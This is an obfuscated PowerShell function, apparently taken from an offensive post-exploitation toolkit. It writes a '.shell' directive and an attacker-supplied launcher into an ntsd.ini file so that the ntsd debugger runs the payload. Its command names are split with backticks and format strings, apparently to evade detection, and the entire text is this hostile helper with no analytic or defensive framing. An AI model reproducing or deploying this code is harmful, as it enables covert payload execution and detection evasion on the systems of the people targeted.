Function w`RitE-INI([string]${P`ATH}, [string]${L`AUnCheR})
{
	
	
	("{1}{0}"-f 'l','.shel') | .("{2}{1}{0}" -f'le','i','Out-F') -Encoding ("{1}{0}" -f 'CII','AS') "$path\ntsd.ini"
	"$launcher" | &("{2}{1}{0}" -f 'le','i','Out-F') -Encoding ("{0}{1}"-f'ASC','II') "$path\ntsd.ini" -Append
}